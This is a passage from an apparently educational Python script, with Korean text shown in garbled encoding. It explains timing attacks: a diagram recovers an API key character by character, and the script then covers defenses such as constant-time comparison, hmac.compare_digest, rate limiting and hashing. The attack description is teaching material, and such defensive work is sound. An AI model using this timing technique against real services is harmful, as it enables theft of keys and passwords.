       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
       â”‚ ì‹œë„: CAXXXXXXXXXXXXXXXXXX                                  â”‚
       â”‚ ì‹œë„: CBXXXXXXXXXXXXXXXXXX                                  â”‚
       â”‚ ì‹œë„: CCXXXXXXXXXXXXXXXXXX  â† ê°€ì¥ ì˜¤ë˜ ê±¸ë¦¼!             â”‚
       â”‚ ...                                                         â”‚
       â”‚ â†’ ë‘ ë²ˆì§¸ ë¬¸ì = 'C'                                       â”‚
       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                â†“
                             ë°˜ë³µ...
                                â†“
       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
       â”‚ ê²°ê³¼: ì „ì²´ API í‚¤ ë³µêµ¬!                                     â”‚
       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
       â”‚ API í‚¤: CC1234567890ABCDEFGH                                â”‚
       â”‚                                                             â”‚
       â”‚ ì´ ì‹œë„ íšŸìˆ˜: 62ë¬¸ì Ã— 21ìë¦¬ = 1,302ë²ˆ                    â”‚
       â”‚ (ê°ê° 20íšŒ ì¸¡ì • = 26,040 ìš”ì²­)                             â”‚
       â”‚                                                             â”‚
       â”‚ ì†Œìš” ì‹œê°„: ë„¤íŠ¸ì›Œí¬ í™˜ê²½ì— ë”°ë¼ ìˆ˜ ë¶„ ~ ìˆ˜ ì‹œê°„             â”‚
       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

    [ì‹¤ì œ ì‚¬ë¡€]

    - 2003ë…„: OpenSSL RSA í‚¤ ì¶”ì¶œ (íƒ€ì´ë° ê³µê²©)
    - 2018ë…„: JWT í† í° ê²€ì¦ ì·¨ì•½ì 
    - ë‹¤ìˆ˜ì˜ ì›¹ í”„ë ˆì„ì›Œí¬ì—ì„œ ë¬¸ìì—´ ë¹„êµ ì·¨ì•½ì  ë°œê²¬
    """)

def show_defense_methods():
    """
    ë°©ì–´ ë°©ë²• ì„¤ëª…

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ 4ë‹¨ê³„: ë°©ì–´ ë°©ë²• - ì–´ë–»ê²Œ íƒ€ì´ë° ê³µê²©ì„ ë§‰ì„ê¹Œ?                  â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    """
    print("\n" + "=" * 70)
    print("4ë‹¨ê³„: ë°©ì–´ ë°©ë²•")
    print("=" * 70 + "\n")

    print("""
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ 1. ìƒìˆ˜ ì‹œê°„ ë¹„êµ (Constant-time comparison)                   â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚                                                                â”‚
    â”‚   # ì·¨ì•½í•œ ì½”ë“œ                                               â”‚
    â”‚   def check(input_key, real_key):                             â”‚
    â”‚       return input_key == real_key  # ë‚´ë¶€ì ìœ¼ë¡œ ìˆœì°¨ ë¹„êµ!   â”‚
    â”‚                                                                â”‚
    â”‚   # ì•ˆì „í•œ ì½”ë“œ                                               â”‚
    â”‚   import hmac                                                 â”‚
    â”‚   def check(input_key, real_key):                             â”‚
    â”‚       return hmac.compare_digest(input_key, real_key)         â”‚
    â”‚       # â†’ í•­ìƒ ëª¨ë“  ë°”ì´íŠ¸ë¥¼ ë¹„êµ! ì‹œê°„ ì°¨ì´ ì—†ìŒ             â”‚
    â”‚                                                                â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ 2. hmac.compare_digest() ì‘ë™ ì›ë¦¬                             â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚                                                                â”‚
    â”‚   def compare_digest(a, b):                                   â”‚
    â”‚       result = 0                                              â”‚
    â”‚       for x, y in zip(a, b):                                  â”‚
    â”‚           result |= x ^ y  # XORë¡œ ë¹„êµ                       â”‚
    â”‚       return result == 0                                       â”‚
    â”‚                                                                â”‚
    â”‚   íŠ¹ì§•:                                                        â”‚
    â”‚   - ì¤‘ê°„ì— ë©ˆì¶”ì§€ ì•ŠìŒ                                        â”‚
    â”‚   - í•­ìƒ ëª¨ë“  ë°”ì´íŠ¸ë¥¼ ë¹„êµ                                   â”‚
    â”‚   - ì‹œê°„ì´ ì…ë ¥ ë‚´ìš©ê³¼ ë¬´ê´€í•˜ê²Œ ì¼ì •                          â”‚
    â”‚                                                                â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ 3. ì–¸ì–´ë³„ ì•ˆì „í•œ ë¹„êµ í•¨ìˆ˜                                     â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚                                                                â”‚
    â”‚   Python:  hmac.compare_digest(a, b)                          â”‚
    â”‚   Node.js: crypto.timingSafeEqual(a, b)                       â”‚
    â”‚   Go:      subtle.ConstantTimeCompare(a, b)                   â”‚
    â”‚   Java:    MessageDigest.isEqual(a, b)                        â”‚
    â”‚   Ruby:    ActiveSupport::SecurityUtils.secure_compare(a, b)  â”‚
    â”‚                                                                â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ 4. ì¶”ê°€ ë°©ì–´ ì „ëµ                                              â”‚
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚                                                                â”‚
    â”‚   1. Rate Limiting (ìš”ì²­ ì œí•œ)                                â”‚
    â”‚      - ë„ˆë¬´ ë§ì€ ì¸ì¦ ì‹œë„ ì°¨ë‹¨                               â”‚
    â”‚      - ê³µê²©ì— í•„ìš”í•œ ìˆ˜ì²œ ë²ˆ ìš”ì²­ ë°©ì§€                        â”‚
    â”‚                                                                â”‚
    â”‚   2. ì¸ìœ„ì  ì§€ì—° ì¶”ê°€                                         â”‚
    â”‚      - ëª¨ë“  ì‹¤íŒ¨ì— ë™ì¼í•œ ì§€ì—° ì¶”ê°€                           â”‚
    â”‚      - ë‹¨, ì´ê²ƒë§Œìœ¼ë¡œëŠ” ë¶ˆì™„ì „                                â”‚
    â”‚                                                                â”‚
    â”‚   3. í•´ì‹œ ë¹„êµ                                                â”‚
    â”‚      - ë¹„ë°€ë²ˆí˜¸ëŠ” í•´ì‹œë¡œ ì €ì¥                                 â”‚
    â”‚      - hash(ì…ë ¥) vs hash(ì €ì¥ê°’) ë¹„êµ                        â”‚
    â”‚      - í•´ì‹œ ê³„ì‚°ì´ ì§€ë°°ì ì´ë¼ íƒ€ì´ë° ì°¨ì´ ê°ì†Œ                â”‚
    â”‚                                                                â”‚
    â”‚   4. ìºì‹œ íƒ€ì´ë° ì£¼ì˜                                         â”‚
    â”‚      - í…Œì´ë¸” ë£©ì—…ë„ íƒ€ì´ë° ê³µê²©ì— ì·¨ì•½í•  ìˆ˜ ìˆìŒ             â”‚
    â”‚      - AES-NI ê°™ì€ í•˜ë“œì›¨ì–´ ê°€ì† ì‚¬ìš©                         â”‚
    â”‚                                                                â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    """)

    # ì‹¤ì œ ì½”ë“œ ì˜ˆì‹œ
    print("[ì‹¤ì œ ì½”ë“œ ë¹„êµ]")
    print("-" * 60)

    import hmac

    real_key = b"SECRET_API_KEY_12345"
    test_key_wrong = b"WRONG_API_KEY_XXXXX"
    test_key_partial = b"SECRET_API_KEY_WRONG"
    test_key_correct = b"SECRET_API_KEY_12345"

    print(f"\n    ì‹¤ì œ í‚¤:   {real_key.decode()}")
    print(f"\n    ì•ˆì „í•œ ë¹„êµ (hmac.compare_digest):")

    for test, desc in [
        (test_key_wrong, "ì™„ì „íˆ ë‹¤ë¥¸ í‚¤"),
        (test_key_partial, "ì¼ë¶€ë§Œ ê°™ì€ í‚¤"),
        (test_key_correct, "ì •í™•íˆ ê°™ì€ í‚¤")
    ]:
        times = []
        for _ in range(100):
            start = time.perf_counter()
            hmac.compare_digest(real_key, test)
            elapsed = time.perf_counter() - start
            times.append(elapsed)

        avg = statistics.mean(times) * 1000000  # ë§ˆì´í¬ë¡œì´ˆ
        print(f"      {desc}: {avg:.2f}Î¼s (ì°¨ì´ ì—†ìŒ)")

    print(f"\n    â†’ ëª¨ë“  ê²½ìš°ì— ê±°ì˜ ë™ì¼í•œ ì‹œê°„!")
    print(f"    â†’ íƒ€ì´ë° ê³µê²© ë¶ˆê°€ëŠ¥!")

if __name__ == "__main__":
    print("â•”" + "â•" * 68 + "â•—")
    print("â•‘" + "íƒ€ì´ë° ê³µê²© Exploit ë°ëª¨".center(68) + "â•‘")
    print("â•‘" + "(ê³ ë“±í•™ìƒë„ ì´í•´í•  ìˆ˜ ìˆëŠ” ì¹œì ˆí•œ ì„¤ëª…)".center(60) + "        â•‘")
    print("â•š" + "â•" * 68 + "â•\n")

    # 1. íƒ€ì´ë° ì°¨ì´ ì‹œì—°
    demonstrate_timing_difference()

    # 2. í†µê³„ì  íƒ€ì´ë° ê³µê²©
    statistical_timing_attack()

    # 3. API í‚¤ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤
    explain_attack_on_api_key()

    # 4. ë°©ì–´ ë°©ë²•
    show_defense_methods()

    print("\n" + "=" * 70)
    print("í•µì‹¬ ì •ë¦¬")
    print("=" * 70)
    print("""
    íƒ€ì´ë° ê³µê²©ì´ë€?
    - ì²˜ë¦¬ ì‹œê°„ì˜ ì°¨ì´ë¥¼ ì´ìš©í•œ ê³µê²©
    - ë¬¸ìì—´ ë¹„êµ ì‹œ ë§ëŠ” ê¸€ìê°€ ë§ì„ìˆ˜ë¡ ì‹œê°„ ì¦ê°€
    - ì´ ì‹œê°„ ì°¨ì´ë¥¼ ì¸¡ì •í•´ì„œ ë¹„ë°€ ê°’ ë³µêµ¬

    ì™œ ìœ„í—˜í•œê°€?
    - ë„¤íŠ¸ì›Œí¬ í™˜ê²½ì—ì„œë„ ê°€ëŠ¥ (í†µê³„ì  ë°©ë²• ì‚¬ìš©)
    - ì•”í˜¸í™” í‚¤, API í‚¤, ë¹„ë°€ë²ˆí˜¸ ë“± íƒˆì·¨ ê°€ëŠ¥
    - ë§ì€ ì‹œìŠ¤í…œì´ ì—¬ì „íˆ ì·¨ì•½í•œ ë¹„êµ ì‚¬ìš©

    ë°©ì–´ ë°©ë²•:
    1. hmac.compare_digest() ì‚¬ìš© (Python)
    2. ìƒìˆ˜ ì‹œê°„ ë¹„êµ í•¨ìˆ˜ ì‚¬ìš©
    3. Rate Limiting ì ìš©
    4. ëª¨ë“  ì•”í˜¸ ë¹„êµì— ì•ˆì „í•œ í•¨ìˆ˜ ì‚¬ìš©

    ê¸°ì–µí•˜ì„¸ìš”:
    "ë¬¸ìì—´ ë¹„êµì— == ì“°ì§€ ë§ˆì„¸ìš”!"
    "hmac.compare_digest() ë¥¼ ì‚¬ìš©í•˜ì„¸ìš”!"
    """)
    print("=" * 70)
